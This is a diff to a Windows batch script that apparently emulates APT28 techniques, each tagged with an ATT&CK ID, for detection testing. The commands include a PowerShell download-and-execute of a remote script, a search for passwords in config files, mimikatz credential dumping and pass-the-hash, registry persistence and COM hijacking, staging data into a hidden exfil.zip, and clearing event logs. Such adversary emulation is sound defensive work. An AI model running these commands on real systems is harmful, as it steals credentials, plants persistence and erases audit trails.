@@ -40,6 +40,27 @@ ECHO.
 
 
 ECHO.
+ECHO -----------------------------------------------
+ECHO [-] Technique: Automated Collection	(T1119)
+ECHO [+] Collection via Powershell
+ECHO -----------------------------------------------
+powershell -noni -nop -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/greycel/APT-Simulation/master/APT28/T1119/AutoCollect.ps1')
+ECHO.
+
+
+
+ECHO.
+ECHO ------------------------------------------------------------------
+ECHO [-] Technique: Data from Local System	(T1005)
+ECHO [+] Simulates Collection of Data from Local System using "forfiles"
+ECHO ------------------------------------------------------------------
+cmd /c forfiles /P "C:\Program Files" /S /M *.conf /C "cmd /c findstr /m password @path" >> %temp%\APT28\T1005.txt
+ECHO.
+
+
+
+
+ECHO.
 ECHO ---------------------------------------------------------------------
 ECHO [-] Technique: Rundll32 (T1085) 
 ECHO [+] Simulates use of "Rundll32" to load and execute suspicious DLL's
@@ -47,6 +68,7 @@ ECHO ---------------------------------------------------------------------
 COPY /Y %utilities%\AllTheThingsx64.dll %PUBLIC%\
 rundll32.exe %PUBLIC%\AllTheThingsx64.dll,EntryPoint
 ECHO.
+
 
 
 
@@ -70,11 +92,23 @@ ECHO.
 
 ECHO.
 ECHO -------------------------------------------------
+ECHO [-] Technique: Credential Dumping (T1003)
+ECHO [+] Simulates Credential Dumping using "mimikatz"
+ECHO --------------------------------------------------
+ping 127.0.0.1 -n 4 > nul
+%temp%\APT28\mime.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> %temp%\APT28\T1075.txt
+ECHO.
+
+
+
+
+ECHO.
+ECHO -------------------------------------------------
 ECHO [-] Technique: Pass the Hash (T1075)
 ECHO [+] Simulates Path-the-Hash (PTH) using "mimikatz"
 ECHO --------------------------------------------------
+ping 127.0.0.1 -n 4 > nul
 %temp%\APT28\mime.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:aria.com /ntlm:cc36gf7a8514793efccd3326464tkg1a" exit
-ping 127.0.0.1 -n 3 > nul
 ECHO.
 
 
@@ -85,10 +119,36 @@ ECHO [-] Technique: Data Staged	(T1074)
 ECHO [+] Collecting System Account and Group Information
 ECHO ----------------------------------------------------
 ECHO.
-net Accounts >> "%temp%\APT28\pi1.log"
-net localgroup administrators >> "%temp%\APT28\pi1.log"
-net config workstation >> "%temp%\APT28\pi1.log"
-net accounts >> "%temp%\APT28\pi1.log"
+net Accounts >> "%temp%\APT28\pi.log"
+net localgroup administrators >> "%temp%\APT28\pi.log"
+net config workstation >> "%temp%\APT28\pi.log"
+net accounts >> "%temp%\APT28\pi.log"
+ECHO.
+
+
+
+ECHO.
+ECHO ------------------------------------------------------------------
+ECHO [-] Technique: Logon Scripts	(T1037)
+ECHO [+] Simulates modification of Registry Key to acehive persistence
+ECHO ------------------------------------------------------------------
+reg add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "cmd.exe /c calc.exe" /f
+ping 127.0.0.1 -n 4 > nul
+reg delete HKCU\Environment /v UserInitMprLogonScript /f
+ECHO.
+
+
+
+ECHO.
+ECHO --------------------------------------------------------
+ECHO [-] Technique: COM Hijacking (T1122)
+ECHO [+] Simulate COM Hijack Technique to execute "calc.exe"
+ECHO --------------------------------------------------------
+reg import %utilities%\Slmgr.reg
+ping 127.0.0.1 -n 2 > nul
+slmgr.vbs
+REG DELETE HKCU\Software\Classes\Scripting.Dictionary\CLSID /f
+REG DELETE HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f
 ECHO.
 
 
@@ -100,7 +160,7 @@ ECHO [-] Technique: Timestomp	(T1099)
 ECHO [+] Simulate Timestomping by modifing timestamps of dropped files
 ECHO -------------------------------------------------------------------
 ECHO.
-%utilities%\timestomper -p2 %systemroot%\system.ini -p %temp%\APT28\ -r
+%utilities%\timestomper.exe -p2 %systemroot%\system.ini -p %temp%\APT28\ -r
 ECHO.
 
 
@@ -112,9 +172,32 @@ ECHO [+] Deleting files to cover the tracks
 ECHO ---------------------------------------
 xcopy /S /Y %utilities%\MessageBox32.dll %appdata%\
 ping 127.0.0.1 -n 4 > nul
-del /f "%appdata%\MessageBox32.dll"
+del /f "%temp%\APT28\procdump.exe"
 del /f "%temp%\APT28\mime.exe"
-del -f "%PUBLIC%\AllTheThingsx64.dll"
+del /f "%appdata%\MessageBox32.dll"
+del /f "%PUBLIC%\AllTheThingsx64.dll"
+ECHO.
+
+
+
+
+ECHO.
+ECHO ----------------------------------------------------
+ECHO [-] Technique: Data compression techniques	(T1002)
+ECHO [+] Compress Data using Command Prompt and Powershell
+ECHO -----------------------------------------------------
+powershell.exe -noprofile -command "DIR %temp%\APT28\* -Recurse | Compress-Archive -force -DestinationPath %temp%\APT28\exfil.zip"
+ECHO.
+
+
+
+ECHO.
+ECHO ------------------------------------------------------
+ECHO [-] Technique: Hidden Files and Directories	(T1158)
+ECHO [+] Simulates Hidding of files using 'attrib' utility
+ECHO ------------------------------------------------------
+ping 127.0.0.1 -n 4 > nul
+attrib +h "%temp%\APT28\exfil.zip"
 ECHO.
 
 
@@ -126,6 +209,9 @@ ECHO [+] Clear Windows Event Logs to hide the tracks
 ECHO ------------------------------------------------
 wevtutil cl System
 wevtutil cl Security
+cmd /k tasklist
 ECHO.
+
+
 
 
